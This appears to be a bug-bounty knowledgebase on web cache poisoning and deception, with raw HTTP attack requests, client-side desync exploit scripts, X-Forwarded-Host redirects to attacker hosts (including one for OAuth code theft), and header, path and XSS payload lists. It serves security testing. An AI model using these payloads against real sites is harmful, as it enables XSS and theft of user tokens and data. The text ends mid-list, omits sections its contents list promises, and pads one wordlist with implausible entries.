# Web Cache Poisoning & Cache Deception - Advanced Bug Bounty Knowledgebase

> **Version**: Research-grade compilation synthesizing PortSwigger research (2018-2024), HackTricks, MDN, community payloads, and real-world bug bounty findings.
> **Scope**: Web cache poisoning, cache deception, cache entanglement, browser-powered desync, DOM poisoning, header abuse, CDN-specific behaviors, automation, and recon methodology.
> **Classification**: Advanced black-box testing reference for bug bounty hunters and penetration testers.

---

## Table of Contents

- [Basics](#basics)
- [Web Cache Theory](#web-cache-theory)
- [Cache Key Internals](#cache-key-internals)
- [Unkeyed Input Exploitation](#unkeyed-input-exploitation)
- [Header Poisoning Payloads](#header-poisoning-payloads)
- [Fat GET Abuse](#fat-get-abuse)
- [X-Forwarded-Host Abuse](#x-forwarded-host-abuse)
- [X-Original-URL Abuse](#x-original-url-abuse)
- [X-Rewrite-URL Abuse](#x-rewrite-url-abuse)
- [Cache Entanglement Techniques](#cache-entanglement-techniques)
- [Browser-Powered Desync Chains](#browser-powered-desync-chains)
- [DOM Cache Poisoning](#dom-cache-poisoning)
- [CSP Bypass + Cache Poisoning Chains](#csp-bypass--cache-poisoning-chains)
- [OAuth Cache Poisoning Attacks](#oauth-cache-poisoning-attacks)
- [Cache Deception Techniques](#cache-deception-techniques)
- [CDN-Specific Behaviors](#cdn-specific-behaviors)
- [Parser Confusion Payloads](#parser-confusion-payloads)
- [Browser Quirks](#browser-quirks)
- [Gadget Chains](#gadget-chains)
- [Real World Case Studies](#real-world-case-studies)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

### What is Web Cache Poisoning?

Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users. It involves two phases:

1. **Elicit a harmful response** from the back-end server by manipulating unkeyed inputs (headers, cookies, etc.).
2. **Get that response cached** so it is served to subsequent visitors with matching cache keys.

A poisoned cache is a **distribution mechanism**, not a standalone attack. The impact depends on:
- What payload can be injected (XSS, open redirect, JS hijacking, DoS).
- How much traffic the affected page receives.
- How long the cache entry persists.

### Web Cache Deception vs. Poisoning

| Feature | Cache Poisoning | Cache Deception |
|---------|----------------|-----------------|
| Goal | Inject malicious content into cached responses | Trick cache into storing sensitive dynamic content |
| Mechanism | Abuse unkeyed inputs / cache key flaws | Abuse path/delimiter/normalization discrepancies |
| Victim | Anyone hitting the poisoned cache key | Attacker retrieves victim's cached sensitive data |
| Key Manipulation | Yes (unkeyed headers, key transformation) | No (exploits cache rules on dynamic URLs) |

### Caching 101

Web caches sit between the user and the application server. They save copies of certain responses to reduce latency and server load. Caches can be:
- **Self-hosted**: Varnish, Squid, NGINX proxy_cache
- **CDN**: Cloudflare, Akamai, Fastly, AWS CloudFront
- **Application-level**: Drupal cache, WP Rocket, Rails fragment caching

---

## Web Cache Theory

### Cache Keys

When a cache receives a request, it generates a **cache key** from specific request components to decide whether a cached copy exists. Typical keyed components:
- Request method (GET, POST, etc.)
- URL path and query string
- Host header
- Sometimes: Origin, Accept-Encoding, Cookie (if Vary is used)

**Example key** (Cloudflare default):
```
${header:origin}::${scheme}://${host_header}${uri}
```

**Example key** (Akamai):
```
/L/redacted.akadns.net/en?x=1 vcd=1234 cid=__Origin=zxcv
```

### Unkeyed Components

Any request component **not** included in the cache key is **unkeyed**. If the application uses an unkeyed input to generate content, an attacker can manipulate it without changing the cache key, causing the poisoned response to be served to other users.

Common unkeyed inputs:
- Most HTTP headers (X-Forwarded-Host, X-Original-URL, etc.)
- Cookies (unless Vary: Cookie is set)
- User-Agent (unless Vary: User-Agent is set)
- Body of GET requests (Fat GET)

### Vary Header

The `Vary` response header tells the cache to include additional request headers in the cache key. It is often used rudimentarily:
```http
Vary: User-Agent, Accept-Encoding
```

**Research note**: CDNs like Cloudflare may ignore `Vary` entirely or only honor it partially. Some sites use `Vary` to key on `User-Agent`, enabling **selective poisoning** - targeting specific browsers or devices.

---

## Cache Key Internals

### Cache Key Transformations

Caches often transform keyed components before storing them. Dangerous transformations include:

| Transformation | Risk |
|----------------|------|
| Excluding query string | Reflected XSS in query params becomes stored |
| Excluding specific params | Parameter cloaking attacks |
| Removing port from Host | DoS via bad port, or XSS via malformed port |
| URL-decoding key | Encoded XSS payloads collide with unencoded keys |
| Normalizing path | Path traversal discrepancies |
| Filtering headers | Header injection into cache key |

### Probing Cache Key Handling

**Methodology** (from Web Cache Entanglement research):
1. **Select a cache oracle**: A cacheable endpoint with visible hit/miss feedback and URL/param reflection.
2. **Probe key handling**: Send two slightly different requests; if the second gets a cache hit, the difference is not in the key.
3. **Identify gadgets**: Chain with XSS, open redirect, JS imports, DOM sinks, etc.

**Akamai cache key disclosure**:
```http
GET /?param=1 HTTP/1.1
Host: example.com
Pragma: akamai-x-get-cache-key, akamai-x-get-true-cache-key
```

**Port exclusion probe**:
```http
GET / HTTP/1.1
Host: redacted.com:1337
```
Then replay without port. If HIT, port is unkeyed. This enables DoS or XSS via `Location: https://host:1337/path`.

### Cache Key Injection

When keyed components are concatenated without delimiter escaping, attackers can craft collisions:

**Akamai example**:
```http
GET /?x=2 HTTP/1.1
Origin: '-alert(1)-'__
```
Cache key: `/D/000/example.com/ cid=x=2__Origin='-alert(1)-'__`

Victim visits:
```http
GET /?x=2__Origin='-alert(1)-' HTTP/1.1
```
Same cache key, but Origin is benign in the second request. The poisoned XSS response is served.

**Cloudflare documentation note**: Cloudflare's documented default key was `${header:origin}::${scheme}://${host_header}${uri}`. Research showed this was vulnerable to injection until delimiter escaping was added.

---

## Unkeyed Input Exploitation

### Identifying Unkeyed Inputs

**Manual approach**:
- Add a random header/value and observe response differences.
- Use Burp Comparer to diff responses.
- Look for reflection in HTML, headers, redirects, JS, CSS, JSON.

**Automated approach**:
- Use **Param Miner** (Burp extension) to guess headers/cookies and detect unlinked inputs.
- Enable "Add static/dynamic cachebuster" and "Include cache busters in headers" to avoid poisoning live users.

**Important**: Always use a cache buster when testing live sites. Param Miner adds `?cachebuster=$randomplz` to avoid affecting real users.

### Common Unkeyed Headers

```text
X-Forwarded-Host
X-Forwarded-Proto
X-Forwarded-Scheme
X-Forwarded-Server
X-Forwarded-For
X-Original-Host
X-Original-URL
X-Rewrite-URL
X-Host
X-HTTP-Host-Override
X-ProxyUser-Ip
X-Remote-IP
X-Remote-Addr
X-Real-IP
X-Client-IP
X-True-Client-IP
CF-Connecting-IP
True-Client-IP
X-Backend-Host
X-Backend-Server
X-Backend-Port
X-Backend-Url
X-Backend-Name
X-Backend-IP
X-Backend-Id
X-Backend-Hostname
X-Backend-Address
X-Backend
X-Accel-Redirect
X-Accel-Buffering
X-Accel-Charset
X-Accel-Expires
X-Accel-Limit-Rate
X-Accel-Vary
```

**Research note**: Downloading and scouring the top 20,000 PHP projects on GitHub for header names revealed headers like `X-Original-URL` and `X-Rewrite-URL` which override the request path. These come from Symfony/Zend frameworks and affect a huge number of PHP applications.

---

## Header Poisoning Payloads

### X-Forwarded-Host XSS

**Basic reflection**:
```http
GET /en?cb=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."><script>alert(1)</script>
```
Response:
```html
<meta property="og:image" content="https://a."><script>alert(1)</script>"/>
```

**Open Graph hijacking**:
```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
```
Response:
```html
<meta property="og:url" content='https://attacker.com/en'/>
```
Anyone sharing the poisoned page shares content of the attacker's choice.

### X-Forwarded-Scheme Redirect Chain

```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps
```
Response:
```http
HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/en
```

This can be chained to steal CSRF tokens from custom HTTP headers by redirecting POST requests.

### Cookie Domain Override

```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: xyz
```
Response:
```http
Set-Cookie: locale=en; domain=xyz
```

Chained with X-Forwarded-Scheme to redirect to arbitrary domain and steal cookies/CSRF tokens.

### Selective Poisoning via Vary

```http
GET / HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0 ... Firefox/60.0
X-Forwarded-Host: a"><iframe onload=alert(1)>
```
Response:
```http
Vary: User-Agent, Accept-Encoding
```

The exploit is only served to Firefox 60 users. Use a list of popular user agents to maximize impact, or tailor to target specific individuals.

---

## Fat GET Abuse

### Concept

A **Fat GET** is a GET request with a body. Some caches (Varnish without builtin.vcl, Cloudflare, Rack::Cache) forward the body to the backend but do NOT include body parameters in the cache key. This allows poisoning arbitrary parameters on cacheable pages.

### GitHub Case Study ($10k bounty)

```http
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

Anyone attempting to report abuse on the attacker's profile would report 'innocent-victim' instead.

### Zendesk Login-CSRF Chain

```http
GET /en-us/signin HTTP/1.1
Host: example.zendesk.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

return_to=/access/logout?return_to=/./access/return_to?flash_digest=secret-token%2526return_to=/final-page?foo=foo%252526bar=bar
```

Anyone entering credentials and clicking 'login' gets redirected through a chain ending up logged into the attacker's account.

### Method Override Workaround

If the site doesn't accept GET bodies directly:
```http
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

param=bad-stuff-here
```

As long as `X-HTTP-Method-Override` is unkeyed, this submits a pseudo-POST while preserving a GET cache key.

---

## X-Forwarded-Host Abuse

### Script Import Hijacking

```http
GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net
```
Response:
```html
<script src="https://portswigger-labs.net/sites/files/foo.js"></script>
```

### Route Poisoning (HubSpot/SaaS)

```http
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: canary
```
Response: 404 from HubSpot - the header takes priority over Host for routing.

Exploit by registering as a HubSpot client and serving malicious content:
```http
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com
```
Response:
```html
<script>alert(document.domain)</script>
```

### Hidden Route Poisoning (Ghost)

```http
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: noshandnibble.ghost.io
```
Response:
```http
HTTP/1.1 302 Found
Location: http://noshandnibble.blog/
```

By registering a Ghost account with a custom domain, redirect requests to blog.cloudflare.com to the attacker's site. Mixed-content protections block HTTPS->HTTP script redirects, but Safari HSTS cache and Edge 302-to-HTTPS bypasses exist.

### Mozilla SHIELD Hijacking

Firefox's SHIELD system fetches recipes using X-Forwarded-Host:
```http
GET /api/v1/ HTTP/1.1
Host: normandy.cdn.mozilla.net
X-Forwarded-Host: xyz.burpcollaborator.net
```
Response:
```json
{
  "action-list": "https://xyz.burpcollaborator.net/api/v1/action/",
  "recipe-list": "https://xyz.burpcollaborator.net/api/v1/recipe/"
}
```

NGINX cached this, potentially affecting tens of millions of Firefox users. Could be used for DDoS, forcing vulnerable extension installs, or replaying old recipes.

---

## X-Original-URL Abuse

### WAF Bypass

```http
GET /admin HTTP/1.1
Host: unity.com
```
Response: 403 Forbidden

```http
GET /anything HTTP/1.1
Host: unity.com
X-Original-URL: /admin
```
Response: 200 OK - Access granted

### Cache Key Confusion

```http
GET /education?x=y HTTP/1.1
Host: example.com
X-Original-URL: /gambling?x=y
```

Cache key is `/education?x=y` but content comes from `/gambling?x=y`. The cache serves gambling content to education requests.

---

## X-Rewrite-URL Abuse

Same behavior as X-Original-URL. Both headers come from Symfony/Zend frameworks and affect many PHP applications.

```http
GET /anything HTTP/1.1
Host: target.com
X-Rewrite-URL: /admin
```

---

## Cache Entanglement Techniques

### Unkeyed Query String

When the entire query string is excluded from the cache key, reflected XSS in parameters becomes a stored vulnerability affecting all visitors to the path.

**Detection**:
```http
GET /?q=canary HTTP/1.1
Host: example.com
```
Then add a cache buster to a keyed header:
```http
GET /?q=canary&cachebuster=1234 HTTP/1.1
Host: example.com
Origin: https://cachebuster.example.com
```

**Exploitation**:
```http
GET //?"><script>alert(1)</script> HTTP/1.1
Host: redacted-newspaper.net
```
Cache key: `https://redacted-newspaper.net//`

Normal visit to `GET // HTTP/1.1` receives the poisoned XSS response.

### Cache Parameter Cloaking

When a cache excludes a specific parameter (e.g., `utm_content`), exploit parsing discrepancies:

**Double-question-mark cloaking**:
```http
GET /?example=123?excluded_param=bad-stuff-here HTTP/1.1
```
Cache sees: `example=123` and `excluded_param=bad-stuff-here`
Server sees: `example=123?excluded_param=bad-stuff-here` (single param)

**Akamai akamai-transform cloaking**:
```http
GET /en?x=1?akamai-transform=payload-goes-here HTTP/1.1
```
Cache key: `/L/redacted.akadns.net/en?x=1 vcd=1234 cid=__`

**Ruby on Rails semicolon delimiter**:
```http
GET /jsonp?callback=legit&utm_content=x;callback=alert(1)// HTTP/1.1
```
Cache sees: `callback=legit` (keyed), `utm_content=x;callback=alert(1)//` (excluded)
Rails sees: `callback=legit`, `utm_content=x`, `callback=alert(1)//` - final callback wins

### Unkeyed Method

Some systems don't include the request method in the cache key:
```http
POST /view/o2o/shop HTTP/1.1
Host: alijk.m.taobao.com
Content-Type: application/x-www-form-urlencoded

_wvUserWkWebView=a</script><svg onload='alert(1)'/data-
```

GET requests to the same path receive the poisoned response.

### Cache Key Normalization (Encoded XSS)

Modern browsers URL-encode XSS characters in the query string, making reflected XSS "unexploitable":
```http
GET /?x=%22/%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
```

But if the cache normalizes (URL-decodes) the key:
```http
GET /?x=%22%3e%3ctest%3e HTTP/1.1
```
has the same key as:
```http
GET /?x="><test> HTTP/1.1
```

Poison with unencoded payload via Burp, victim's encoded request collides and receives XSS.

### Relative Path Overwrite + Cache Poisoning

Cache poisoning can inject malicious CSS into HTML pages, making Relative Path Overwrite (RPO) attacks more exploitable. If a page lacks a doctype, browsers will execute CSS found anywhere in an HTML response.

---

## Browser-Powered Desync Chains

### Client-Side Desync (CSD) Concept

Traditional desync attacks poison the front-end/back-end connection. **Client-side desync** poisons the connection between the victim's browser and the front-end server, enabling exploitation of single-server websites.

**Attack flow**:
1. Victim visits attacker's website
2. Attacker's site makes the browser send two cross-domain requests to the vulnerable site
3. First request desyncs the browser's connection
4. Second request triggers a harmful response

### CSD Detection Methodology

**Step 1 - Detect**:
Identify a CSD vector: a request where the server ignores the Content-Length. Target static files, redirects, and error endpoints.

```http
POST /favicon.ico HTTP/1.1
Host: example.com
Content-Length: 5
X
```
If server responds without waiting for body, promising.

**Step 2 - Confirm**:
Send two requests down the same connection:
```http
POST /favicon.ico HTTP/1.1
Host: example.com
Content-Length: 23

GET /404 HTTP/1.1
X: Y

GET / HTTP/1.1
Host: example.com
```

**Step 3 - Browser confirm**:
```javascript
fetch('https://example.com/', {
    method: 'POST',
    body: "GET /hopefully404 HTTP/1.1
X: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://example.com/'
})
```

### Akamai Stacked HEAD Exploit

```javascript
fetch('https://www.capitalone.ca/assets', {
    method: 'POST',
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1
Host: www.capitalone.ca

GET /x?x=<script>alert(1)</script> HTTP/1.1
X: Y`,
    credentials: 'include',
    mode: 'cors'
}).catch(() => {
    location = 'https://www.capitalone.ca/'
})
```

Use `mode: 'cors'` to trigger a CORS error and prevent redirect following, then navigate in catch().

### Cisco Web VPN Client-Side Cache Poisoning

```javascript
fetch('https://redacted/', {
    method: 'POST',
    body: "GET /+webvpn+/ HTTP/1.1
Host: x.psres.net
X: Y",
    credentials: 'include'
}).catch(() => {
    location = 'https://redacted/+CSCOE+/win.js'
})
```

The browser caches the malicious redirect for `win.js`, then when the login page loads, it follows the cached redirect and executes attacker's JS.

### Verisign Fragmented Chunk

```javascript
fetch('https://www.verisign.com/%2f', {
    method: 'POST',
    body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1
Host: www.verisign.com
Connection: keep-alive
Transfer-Encoding: chunked

34d
x`,
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'}
}).catch(() => {
    let form = document.createElement('form')
    form.method = 'POST'
    form.action = 'https://www.verisign.com/robots.txt'
    form.enctype = 'text/plain'
    let input = document.createElement('input')
    input.name = '0

GET /<svg/onload=alert(1)> HTTP/1.1
Host: www.verisign.com

GET /?aaaaaaaaaaaaaaa HTTP/1.1
Host: www.verisign.com

'
    input.value = ''
    form.appendChild(input)
    document.body.appendChild(form)
    form.submit()
})
```

### Pause-Based Desync (Varnish)

Varnish's `synth()` feature times out after 15 seconds on partial requests, leaving the connection open for reuse:

1. Send headers promising a body
2. Wait for timeout response
3. Send body, which is interpreted as a fresh request

---

## DOM Cache Poisoning

### Concept

When unkeyed inputs control DOM-based resource loading (e.g., `data-site-root` attribute), the attacker can redirect JavaScript fetches to attacker-controlled servers.

### data.gov Case Study

```http
GET /dataset HTTP/1.1
Host: catalog.data.gov
X-Forwarded-Host: canary
```
Response:
```html
<body data-site-root="https://canary/">
```

JavaScript uses this attribute to load i18n data:
```javascript
// Browser makes request to:
GET /api/i18n/en HTTP/1.1
Host: id.burpcollaborator.net
```

Attacker serves malicious translation file:
```json
{"Show more": "<svg onload=alert(1)>"}
```

Anyone viewing a page with "Show more" text gets exploited.

### JSONP + Cache Poisoning

```http
GET /jsonp?callback=innocentFunction HTTP/1.1
Host: example.com
```

Cache parameter cloaking to override callback:
```http
GET /jsonp?callback=legit&utm_content=x;callback=alert(1)// HTTP/1.1
```

---

## CSP Bypass + Cache Poisoning Chains

### Policy Injection via Cache Poisoning

If a site generates CSP dynamically using unkeyed headers, cache poisoning can inject malicious policies:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

If the application uses X-Forwarded-Host to construct CSP sources:
```http
Content-Security-Policy: default-src 'self' https://evil.com
```

### nonce bypass via cache poisoning

If CSP nonces are generated per-request but the response is cached, the nonce becomes predictable/reusable across users.

---

## OAuth Cache Poisoning Attacks

### Hidden OAuth Attack Vectors

OAuth endpoints often support custom headers for routing. If the cache doesn't key on these headers:

```http
GET /oauth/authorize HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

The authorization redirect can be poisoned to send the victim to the attacker's domain with the authorization code.

### Token Leakage via Cache Deception

OAuth token endpoints returning JSON can be cached if the cache misinterprets the path:
```http
GET /oauth/token;foo.js HTTP/1.1
```

If the origin server truncates at `;` but the cache sees `.js`, the token response may be cached and retrievable by the attacker.

---

## Cache Deception Techniques

### Path Mapping Discrepancies

**REST vs Traditional URL mapping**:
```
Origin (REST): /user/123/profile/wcd.css -> /user/123/profile (ignores wcd.css)
Cache (Traditional): /user/123/profile/wcd.css -> caches as CSS file
```

**Test**: Add arbitrary path segment:
```
/api/orders/123 -> /api/orders/123/foo
```
If response is identical, origin abstracts the path.

### Delimiter Discrepancies

**Java Spring matrix variables**:
```
/profile;foo.css
```
Origin truncates at `;` -> `/profile`
Cache sees full path ending in `.css` -> caches

**Ruby on Rails format specifier**:
```
/profile.ico
```
Rails: no ICO formatter, falls back to HTML -> returns profile
Cache: sees `.ico` -> caches

**OpenLiteSpeed null byte**:
```
/profile%00foo.js
```
OpenLiteSpeed truncates at `%00`
Akamai/Fastly may see full path

### Normalization Discrepancies

**Origin decodes + resolves, cache doesn't**:
```
/static/..%2fprofile
```
Origin: `/profile` (dynamic)
Cache: `/static/..%2fprofile` (matches `/static` rule)

**Cache decodes + resolves, origin doesn't**:
```
/profile%2f%2e%2e%2fstatic
```
Cache: `/static`
Origin: `/profile%2f%2e%2e%2fstatic` (error)

Need to add delimiter that origin uses but cache doesn't:
```
/profile;%2f%2e%2e%2fstatic
```
Origin (uses `;`): `/profile`
Cache: `/static`

### File Name Rules

Common cached files: `robots.txt`, `index.html`, `favicon.ico`

```
/profile%2f%2e%2e%2findex.html
```
If cache normalizes to `/index.html`, the profile response is cached.

---

## CDN-Specific Behaviors

### Cloudflare

- **Cache key**: `${header:origin}::${scheme}://${host_header}${uri}` (patched for injection)
- **Vary**: Often ignored or partially honored
- **CF-Cache-Status**: HIT/MISS/DYNAMIC/EXPIRED
- **Cache Deception Armor**: Protection that verifies Content-Type matches URL extension
- **PURGE**: Some configs allow unauthenticated cache deletion
- **Port exclusion**: Port removed from cache key (vulnerable to DoS/XSS)
- **Query string exclusion**: Common misconfiguration
- **Fat GET**: Cloudflare forwards GET bodies but doesn't include them in cache key

### Akamai

- **Cache key disclosure**: `Pragma: akamai-x-get-cache-key`
- **akamai-transform**: Excluded from cache key but can cloak other params
- **Port exclusion**: Port removed from key
- **X-True-Cache-Key**: Shows actual cache key
- **Cache key injection**: Historical vulnerability in delimiter handling

### Fastly

- **Vary**: Honored more consistently than Cloudflare
- **Port exclusion**: Patched (was vulnerable)
- **FASTLYPURGE**: Method for cache deletion
- **User-Agent keying**: Common for mobile/desktop separation

### Varnish

- **builtin.vcl**: Removes GET body by default
- **Fat GET**: If builtin.vcl is missing, body forwarded but not keyed
- **synth()**: Timeout-based desync possible
- **Custom VCL**: Highly configurable, many custom key rules

### AWS CloudFront

- **Default cache key**: Method + scheme + host + URI
- **Cache behaviors**: Highly configurable
- **Signed URLs**: Can be bypassed if cache key doesn't include signature parameters

### NGINX

- **proxy_cache_key**: `$scheme$proxy_host$request_uri` (default)
- **URL normalization**: Cache key is normalized but forwarded request may not be
- **proxy_pass without URI**: Request URI passed "in the same form" as sent by client

---

## Parser Confusion Payloads

### Double Path Parsing

```http
GET /path/to/resource HTTP/1.1
Host: target.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

### Path Traversal in Cache Key

```http
GET /static/..%2f..%2fadmin HTTP/1.1
```

### Query String Injection in Path

```http
GET /page%3fparam=value HTTP/1.1
```

### Null Byte Truncation

```http
GET /profile%00.js HTTP/1.1
```

### Semicolon Parameter Injection

```http
GET /page;param=value HTTP/1.1
```

### Encoded Slash Confusion

```http
GET /api%2fv1%2fusers HTTP/1.1
```

---

## Browser Quirks

### Safari HSTS Upgrade

If the attacker's domain is in Safari's HSTS cache, HTTP redirects are automatically upgraded to HTTPS, bypassing mixed-content protections.

### Edge 302-to-HTTPS Bypass

Edge completely bypasses mixed-content protection when receiving a 302 redirect to a HTTPS URL (discovered by Manuel Caballero, exploited by Sam Thomas).

### Chrome Connection Pooling

Chrome maintains separate connection pools for:
- Requests with cookies
- Requests without cookies

When poisoning, use `credentials: 'include'` to target the "with-cookies" pool.

### Firefox SHIELD

Firefox sends lowercase `origin: null` header when fetching SHIELD recipes. The `X-Forwarded-Host` header can redirect recipe fetching to attacker-controlled servers.

### Stacked Response Problem

Browsers discard connections if they receive more response data than expected. To solve this in CSD attacks:
- Use cache-busters to delay responses (trigger cache miss)
- Pad injected requests with lengthy headers
- Use chunked encoding to consume extra data

---

## Gadget Chains

### Reflected XSS -> Stored XSS

Classic chain: Unkeyed header reflects in HTML -> poison cache -> all users receive XSS.

### Open Redirect -> Cache Poisoning

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Proto: http
X-Forwarded-Host: attacker.com
```
Response:
```http
HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/
```

### JSONP Callback Hijacking

Override callback parameter via cache parameter cloaking to execute arbitrary JS.

### CSS Import Injection

```http
GET /style.css?x=a);@import... HTTP/1.1
```
Response:
```css
@import url(/site/home/index-part1.8a6715a2.css?x=a);@import...
```

Inject malicious CSS that exfiltrates data from pages importing the stylesheet.

### Translation File Hijacking

Poison `data-site-root` to redirect i18n JSON loads to attacker server. Serve malicious translations containing XSS payloads.

### Resource File Poisoning

Static JS/CSS files that reflect query parameters can be poisoned. Browsers execute them when imported by pages, even cross-domain.

### DoS via Redirect

```http
GET /login?x=very-long-string... HTTP/1.1
Host: www.cloudflare.com
```

Redirect adds a `/` making URI one byte longer, triggering 414 Request-URI Too Large on the destination.

---

## Real World Case Studies

### Red Hat Homepage (Akamai)

- **Unkeyed header**: X-Forwarded-Host
- **Gadget**: Open Graph meta tag
- **Payload**: `a."><script>alert(1)</script>`
- **Impact**: XSS on homepage for all visitors
- **CDN**: Akamai (CNAME to edgekey.net)

### Unity3d.com (Varnish)

- **Unkeyed header**: X-Host
- **Gadget**: Script src attribute
- **Cache headers**: Age: 174, max-age: 1800
- **Impact**: Precise timing attack possible
- **Defense**: Cache headers revealed exact expiry time

### data.gov (CloudFront)

- **Unkeyed header**: X-Forwarded-Host
- **Gadget**: data-site-root DOM attribute -> i18n JSON loading
- **Impact**: DOM-based XSS via translation poisoning
- **Technique**: Match/replace rule in Burp to identify gadget

### Mozilla SHIELD (NGINX)

- **Unkeyed header**: X-Forwarded-Host
- **Gadget**: Firefox recipe fetching system
- **Impact**: Potential mass extension installation, DDoS, recipe replay
- **Bounty**: $1,000 (disputed severity)

### GitHub ($10k bounty)

- **Technique**: Fat GET
- **Cache**: Varnish (without builtin.vcl)
- **Impact**: Abuse report redirection, filter manipulation, repo access denial
- **Fix**: Varnish configuration update

### Cloudflare Blog (Ghost)

- **Unkeyed header**: X-Forwarded-Host
- **Gadget**: Ghost custom domain redirect
- **Impact**: Resource hijacking on Safari/Edge (full compromise), image hijacking on Chrome/Firefox
- **Technique**: Hidden route poisoning via SaaS platform

### Online Newspaper (Unkeyed Query)

- **Technique**: Unkeyed query string
- **Gadget**: Reflected XSS in query parameter
- **Impact**: Full control over every page on the site
- **Key insight**: Query string exclusion masked the XSS from normal testing

### Firefox Update System (NGINX)

- **Technique**: Cache key normalization (URL-decode)
- **Payload**: `GET /%3fproduct=firefox-73.0.1-complete... HTTP/1.1`
- **Impact**: Global Firefox update failure
- **Root cause**: NGINX decoded cache key but not forwarded request

---

## Fuzzing Payloads

### Header Fuzzing Wordlist (Core)

```text
X-Forwarded-Host
X-Forwarded-Proto
X-Forwarded-Scheme
X-Forwarded-Server
X-Forwarded-For
X-Forwarded-Port
X-Forwarded-Ssl
X-Forwarded-Protocol
X-Original-Host
X-Original-URL
X-Rewrite-URL
X-Host
X-HTTP-Host-Override
X-ProxyUser-Ip
X-Remote-IP
X-Remote-Addr
X-Real-IP
X-Client-IP
X-True-Client-IP
CF-Connecting-IP
True-Client-IP
X-Backend-Host
X-Backend-Server
X-Backend-Port
X-Backend-Url
X-Backend-Name
X-Backend-IP
X-Backend-Id
X-Backend-Hostname
X-Backend-Address
X-Backend
X-Accel-Redirect
X-Accel-Buffering
X-Accel-Charset
X-Accel-Expires
X-Accel-Limit-Rate
X-Accel-Vary
X-HTTP-Method-Override
X-HTTP-Method
X-Method-Override
X-Method
X-Override-Method
X-Original-Method
X-Rewrite-Method
X-Real-Method
X-Requested-With
X-Request-ID
X-Correlation-ID
X-Trace-ID
X-Transaction-ID
X-Session-ID
```

### Cache Deception Path Fuzzing

```text
/profile/robots.txt
/profile/favicon.ico
/profile/index.html
/profile;.css
/profile;.js
/profile.ico
/profile.png
/profile.jpg
/profile.gif
/profile.svg
/profile.woff
/profile.woff2
/profile.ttf
/profile.eot
/profile.otf
/profile.swf
/profile.xml
/profile.json
/profile.txt
/profile.pdf
/profile.zip
/profile.tar
/profile.gz
/profile.bz2
/profile.rar
/profile.7z
/profile.exe
/profile.dll
/profile.so
/profile.dylib
/profile.app
/profile.apk
/profile.ipa
/profile.deb
/profile.rpm
/profile.msi
/profile.pkg
/profile.dmg
/profile.iso
/profile.img
/profile.vmdk
/profile.ova
/profile.ovf
/profile.qcow2
/profile.vdi
/profile.vhd
/profile.vhdx
/profile.raw
/profile.bin
/profile.dat
/profile.db
/profile.sql
/profile.sqlite
/profile.sqlite3
/profile.mdb
/profile.accdb
/profile.dbf
/profile.fdb
/profile.gdb
/profile.ndb
/profile.sdf
/profile.wdb
/profile.odb
/profile.udb
/profile.ldf
/profile.mdf
/profile.ndf
/profile.trn
/profile.bak
/profile.tmp
/profile.temp
/profile.old
/profile.bkp
/profile.sav
/profile.save
/profile.orig
/profile.original
/profile.bak1
/profile.bak2
/profile.bak3
/profile~1
/profile~2
/profile~3
/profile.1
/profile.2
/profile.3
/profile.001
/profile.002
/profile.003
/profile.0001
/profile.0002
/profile.0003
/profile.2024
/profile.2025
/profile.2026
/profile.v1
/profile.v2
/profile.v3
/profile.ver
/profile.version
/profile.rev
/profile.revision
/profile.rel
/profile.release
/profile.beta
/profile.alpha
/profile.dev
/profile.development
/profile.staging
/profile.stage
/profile.test
/profile.testing
/profile.qa
/profile.uat
/profile.prod
/profile.production
/profile.live
/profile.demo
/profile.sample
/profile.example
/profile.template
/profile.tpl
/profile.tmpl
/profile.default
/profile.def
/profile.std
/profile.standard
/profile.norm
/profile.normal
/profile.reg
/profile.regular
/profile.typ
/profile.typical
/profile.gen
/profile.generic
/profile.common
/profile.pub
/profile.public
/profile.priv
/profile.private
/profile.sec
/profile.secure
/profile.int
/profile.internal
/profile.ext
/profile.external
/profile.loc
/profile.local
/profile.rem
/profile.remote
/profile.glob
/profile.global
/profile.uni
/profile.universal
```

### XSS Payloads for Cache Poisoning

```html
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
"><iframe onload=alert(1)>
"><body onload=alert(1)>
"><input onfocus=alert(1) autofocus>
"><select onfocus=alert(1) autofocus>
"><textarea onfocus=alert(1) autofocus>
"><keygen onfocus=alert(1) autofocus>
"><video><source onerror=alert(1)>
"><audio><source onerror=alert(1)>
